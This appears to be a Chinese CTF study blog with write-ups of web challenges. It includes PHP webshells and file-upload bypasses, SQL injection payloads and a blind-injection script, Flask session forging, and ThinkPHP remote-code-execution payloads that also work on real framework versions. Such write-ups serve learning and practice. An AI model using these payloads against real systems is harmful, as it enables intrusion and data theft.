href="#2021-03-19续2021-03-13" class="headerlink" title="2021-03-19续2021-03-13"></a>2021-03-19续2021-03-13</h1><h2 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>根据代码得知username=admin&amp;password=100，所以对其进行序列化，并输出序列化以后的内容</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}</code></pre><p>又因为是get传入参数select</p><p>又因为__wakeup函数会将username的值改为guess所以将name后面的属性值改为3，又因为</p><p>private属性序列化:%00类名%00成员名<br>protect属性序列化:%00*%00成员名</p><p>所以：</p><pre><code>/?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre><p>得到flag</p><h1 id="2021-03-22"><a href="#2021-03-22" class="headerlink" title="2021-03-22"></a>2021-03-22</h1><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>用bp抓包针对其后面的文件进行爆破，字典用的的3月13号做php反序列化用到的字典，会得到index.php.bak</p><p>在bp中直接查看响应：</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}?&gt;</code></pre><p><a href="https://www.runoob.com/php/php-intval-function.html" target="_blank" rel="noopener">PHP intval() 函数</a></p><p>?key=123</p><h1 id="2021-4-20"><a href="#2021-4-20" class="headerlink" title="2021-4-20"></a>2021-4-20</h1><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>这道题后面的两个套娃分别是get和post的md5碰撞</p><p>a[]=1&amp;b[]=2，利用数组来绕过即可</p><p>而此题目的关键在于第一步的：.</p><p>考点sql注入：md5($password,true)</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><p>​         <strong>md5(*string,raw*)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。1.默认不写为FALSE。32位16进制的字符串TRUE。2.16位原始二进制格式的字符串</td></tr></tbody></table><p>而这里重要的字符转则是ffifdyop，当他在数据库中则会被当做16进制处理而此时是先经过md5加密成32位的16进制后了的所以会被编译成“6xxxxxxx” ，从而实现了万能钥匙</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>问题点在于前端给定的两张照片的后缀，就是你要在抓包的时候修改.htaccess的content_type：image/png</p><p>同时其内容为</p><pre><code>&lt;FilesMatch &quot;fuck&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>意思就是将所有名字中含有fuck字符的文件都以php执行，然后上传fuck.png就可以了</p><p>用菜刀连接，我的蚁剑乱码了</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>这也是一道文件上传题目，考查的知识点是.user.ini文件的也就是可以用户自定义的php.ini文件，首先这个题目会先使用exif_imagetype函数来判断你所上传的图像的类型，面对这种函数采用图片马绕过当时即可，同时.user.ini文件也需要进行一个图形化的处理：</p><ul><li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li><li>PNG： 89 50 4E 47</li></ul><p>这里我采用的是GIF89a：</p><pre><code>GIF89aauto_prepend_file=hack.jpg</code></pre><p>图片马制作命令：</p><pre><code>copy 1.jpg/a + 1.php/b hack.jpg</code></pre><p>1.php中需要重新编辑为：</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;666&#39;]);&lt;/script&gt;</code></pre><p>因为后端会对你的&lt;?来进行一个检测</p><p>上传成功后在给出的路径下访问index.php来触发（启动）这个.user.ini，然后post传参就行</p><p>扫描根目录：666=var_dump(scandir(“/“));，我们可以可以看见一个叫flag的文件<br>打印：666=var_dump(file_get_contents(“/flag”));</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>先利用sqlfuzz字典来看看哪些函数被禁用：</p><p>发现or，order,information_schema被过滤，但是order可以通过Order来进行绕过。</p><p>构造payload</p><pre><code>name=1&#39; Order by 4#&amp;pw=1234name=1&#39; Order by 3#&amp;pw=1234</code></pre><p>可以判断有3列，通常为id，username，pw</p><p><strong>本题考点：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><p>因为给出了源码地址，所以可以会知道在传入pw后会被$pw=md5（$password）</p><p>所以先构造</p><pre><code>name=admin&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></pre><p>来临时创建一个数据</p><p>md5=123456，又因为后面#将’注释掉了，而pw为另一个参数并不在同一row，所以不用担心会被注释掉</p><h1 id="2021-4-22"><a href="#2021-4-22" class="headerlink" title="2021-4-22"></a>2021-4-22</h1><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>先注册账号，然后登陆，在/change页面下查看源代码，得到：<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51826_1.png" alt></p><p>也就是python的轻型web开发框架：flask，这里是指明了几个子页面，针对于flask框架的session是保存在客户端的cookie中的，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p>具体可参考：<br><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">https://xz.aliyun.com/t/3569</a><br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html#</a></p><p>步骤：</p><p>1.得到session</p><p>2.解密session：</p><p>脚本（亲测好用）：</p><pre><code># flask框架，针对session的解密脚本# 用法python hctf_admin.py [session值]import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>得到：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51831_2.png" alt></p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>但是如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY</p><p>3.根据得到的网站源代码继续查找：</p><p>其中在config.py中找到了SECRET_KEY：ckj123</p><p>通过index.html中得知session[‘name’] == ‘admin’即可得到flag</p><p>4.修改序列化中的内容：</p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>5.利用SECRET_KEY：ckj123生成session，并传入到客户端去访问：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51904_3.png" alt></p><pre><code>.eJw9kMGKwkAMhl9lydlDnV0vghdpd2ghGSpTy8xFtK22aceFqtQd8d13cMFDICHJ9__JA3bHsbm0sLyOt2YGu66G5QM-DrAELNMF6ppVid7G3wPJba9k1iNvB-JQ-zQiWSzImy_D6SfFbUdlEZGnMLdpKS4iFIk3pQmR3pWuPLkNG59MRqQTSmKrc2Fl1imdR5bxjrx2JGxrufJK94uQdzauByyT4CXoiHwyZdYqaR3J5I7xyRtdrOA5g-oyHnfXn745v08w_vSLfj0gkwu4udLJZLmPwnKwFwQ5Y3SpCBYDqhDots5Mqxeuc_tT8ybRMIx1_t85711owL523RlmcLs04-tvMI_g-QeRUW4a.YIFYNg.6MtE1lVA6UDS3WQgL-7tDF6oph0</code></pre><p>解得：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51907_4.png" alt></p><h2 id="ThinkPHP-5-Rce-1"><a href="#ThinkPHP-5-Rce-1" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p><strong>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞</strong></p><p>thinkphp为php的一个开发框架</p><p>flag在phpinfo中，payload：</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></pre><p>同时也可以这样：</p><p>将phpinfo换为system</p><p>-1改为：</p><p>1.touch shell.php</p><p>2.echo “<?php @eval(\$_POST['cmd']);?>“ &gt;&gt; fuck.php来实现文件上传</p><h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><p><strong>漏洞范围: &lt;= 5.0.23、&lt;= 5.1.32</strong></p><p>漏洞利用：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52147_5.png" alt></p><pre><code>修改GET 为POST；添加Content-Type: application/x-www-form-urlencoded_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A52153_6.png" alt></p><pre><code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=-1</code></pre><h1 id="2021-4-23"><a href="#2021-4-23" class="headerlink" title="2021-4-23"></a>2021-4-23</h1><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>得到的三个页面：</p><p>/flag.txt<br>flag in /fllllllllllllag</p><p>/welcome.txt<br>render</p><p>/hints.txt<br>md5(cookie_secret+md5(filename))</p><p>右键查看源代码：</p><pre><code>&lt;a href=&#39;/file?filename=/flag.txt&amp;filehash=ba37a4275f6ddf86b04f206ba3d7a173&#39;&gt;/flag.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/welcome.txt&amp;filehash=b19fea9259deebcc9c37cbf3e229688b&#39;&gt;/welcome.txt&lt;/a&gt;&lt;br/&gt;&lt;a href=&#39;/file?filename=/hints.txt&amp;filehash=fa122b5860e6f12aa608974974e03f80&#39;&gt;/hints.txt&lt;/a&gt;</code></pre><p>看大手子们说render是python的一个渲染函数，他们的url都是由filename和filehash组成，filehash即为他们filename的md5值。</p><p>也就看出来了，源代码里面就是render的一个体现，根据提示2知道filename=/fllllllllllllag.txt同时也就会知道md5值</p><p>知识点：</p><p>关于找cookie_secret，存在msg参数，可以进行模板注入：</p><pre><code>{{}}。尝试了error?msg={{1}}，可以构造一下payload：?msg{{handler.settings}}，来得到cookie_secret</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8823%E6%97%A51456_1.png" alt></p><p>然后通过脚本来实现md5(cookie_secret+md5(filename))</p><pre><code>import hashlibdef md5(s):    md5 = hashlib.md5()    md5.update(s.encode(&quot;utf-8&quot;))#注意encode    return md5.hexdigest()def filehash():    filename = &quot;/fllllllllllllag&quot;    cookie_secret = &quot;372e1e52-7d6f-4c5e-9d9e-9df4d88947b9&quot;    print(md5(cookie_secret + md5(filename)))filehash()</code></pre><p>得到伴随着cookie_secret将/fllllllllllllag，md5处理后的md5值：312923d3a93b268a692e63de56587cd9</p><p>然后取代并访问：</p><pre><code>http://5b834ffd-6390-4d10-a586-d13b008b2da7.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=312923d3a93b268a692e63de56587cd9</code></pre><p>得到flag</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>考点：</p><p>1.php伪协议的利用</p><p>2.php反序列化操作</p><p>知识点：</p><p><a href="https://www.jianshu.com/p/0a8339fcc269" target="_blank" rel="noopener">PHP伪协议在CTF中的应用</a></p><p>1.关于data://的伪协议利用</p><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输<br>比如：<br>通过data://text/plain协议来进行漏洞利用。<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br>url=data://text/plain,<?php print_r(glob("*")); ?></p><p>2.php://filter的利用</p><p>?file=php://filter/read=convert.base64-encade/resource=useless.php</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><h3 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h3><h4 id="1-代码审计："><a href="#1-代码审计：" class="headerlink" title="1.代码审计："></a>1.代码审计：</h4><pre><code>&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        echo &quot;Not now!&quot;;        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt;</code></pre><h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><p>要求传入的text中含有welcome to the zjctf字段，同时保证为一个文本文件，所以考点就是data://text/plain；紧接着构造参数：</p><pre><code>/?text=data://text/plain,welcome to the zjctf</code></pre><p>或者：</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>此种情况是为了防止过滤</p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><p>过滤掉传入file参数中的flag，同时给出提示//useless.php，得知运用include的话就可以利用php://input伪协议来实现文件读取（这里很明显需要读取文件），构造参数：</p><pre><code>&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>二者联合得：</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><p>针对得到的useless.php的base64进行解码得到：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>他指引我们去给file赋值为flag.php</p><p>本地进行序列化：</p><pre><code>&lt;?php  class Flag{  //flag.php      public $file = &quot;flag.php&quot;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  $a = new Flag();echo serialize($a);?&gt;  </code></pre><p>得到：O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><h5 id="最后一步："><a href="#最后一步：" class="headerlink" title="最后一步："></a>最后一步：</h5><p>整合payload</p><pre><code>/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>右键源代码即可得到flag</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><pre><code>import requestsimport base64import sysimport stringimport hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#39;utf-8&#39;)  # 改变标准输出的默认编码,否则s.text不能输出x = string.printableflag = &quot;&quot;url = &quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;payload = {    &quot;id&quot;: &quot;&quot;}for i in range(0, 60):    for j in x:        payload[&quot;id&quot;] = &quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot; % (str(i), ord(j))        s = requests.post(url, data=payload)        # print(s.text)        if &quot;Hello&quot; in s.text:            flag += j            print(flag)            breakprint(flag)</code></pre><h3 id="脚本的解释："><a href="#脚本的解释：" class="headerlink" title="脚本的解释："></a>脚本的解释：</h3><h4 id="payload-“id”-的来源："><a href="#payload-“id”-的来源：" class="headerlink" title="payload[“id”]的来源："></a>payload[“id”]的来源：</h4><p>post提交需要传入的参数为id</p><h4 id="关于1-1的优先运算："><a href="#关于1-1的优先运算：" class="headerlink" title="关于1=()=1的优先运算："></a>关于1=()=1的优先运算：</h4><p>1=(if(1&gt;0))=1这样会正常回显</p><p>1=(if(1&lt;0))=1这样不会正常回显</p><p>一个运算结果为true，一个为false</p><p>第一个1与if函数返回的值进行判断，会得到1或者0，为了确保返回值一定为true，所以再与后面的1（true）再来一次确定性质的判断</p><p>第二次的=是为了保证第一次的事件成立后再执行</p><p>跟高中数学的概率一样</p><p>保证a事件发生的前提下发生b事件</p><h4 id="if-“Hello”-in-s-text"><a href="#if-“Hello”-in-s-text" class="headerlink" title="if “Hello” in s.text:"></a>if “Hello” in s.text:</h4><p>因为返回正确的时候才会显hello</p><h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><p>ThinkPHP 2.x 的任意代码执行漏洞</p><p>题目：</p><pre class="line-numbers language-php"><code class="language-php">示例源码控制器IndexAction类<span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">IndexAction</span> <span class="token keyword">extends</span> <span class="token class-name">Action</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span><span class="token string">'Hello,ThinkPHP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre><code>?s=/Index/index/L/${@phpinfo()}</code></pre><h1 id="2021-4-24"><a href="#2021-4-24" class="headerlink" title="2021-4-24"></a>2021-4-24</h1><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>知识点：</p><p>1.联合查询</p><p>2.php反序列化</p><p>登陆后有三栏，username，age，blog，查看源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8824%E6%97%A50928_1.png" alt></p><p>发现这里用data://伪协议会输出一些东西，可以是flag</p><p>又因为此页面存在sql注入点，sqlmap跑不动，也可能是我不会使。。。</p><p>可以用sqlfuzz小字典跑一下，但是我有wp我就不跑了。。。</p><p>payload如下：</p><p>绕过waf的姿势：</p><pre><code>union all selectunion/**/select/*!union*/ select</code></pre><pre><code>?no=1 and 1=1#整数型啊，很好?no=1 order by 4#有4列?no=1 order by 5#报错?no=-1 union/**/select 1,2,3,4#?no=-1 union/**/select 1,database(),3,4#库名：fakebook?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;#表明：users?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#列名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS?no=-1 union/**/select 1,group_concat(no,&#39;**&#39;,username,&#39;**&#39;,passwd,&#39;**&#39;,data),3,4 from fakebook.users#</code></pre><p>最终得到：</p><p>no：1</p><p>username：test</p><p>passwd：cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e</p><p>data：O:8:”UserInfo”:3:{s:4:”name”;s:4:”test”;s:3:”age”;i:123;s:4:”blog”;s:7:”123.com”;}</p><p>并显示报错：</p><p><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong></p><p>也就是说data可以传入反序列化，有序列化就会有源码，备份字典跑一下，得到robots.txt：</p><p>User-agent: *<br>Disallow: /user.php.bak</p><p>user.php内容：<a href="https://blog.csdn.net/qq_43622442/article/details/105633194" target="_blank" rel="noopener">这篇文章对该序列化进行了很好的解释</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># curl_setopt ： 请求一个url。其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token shell-comment comment"># CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token shell-comment comment"># curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#如果状态码不是404，就返回exec的结果。</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> 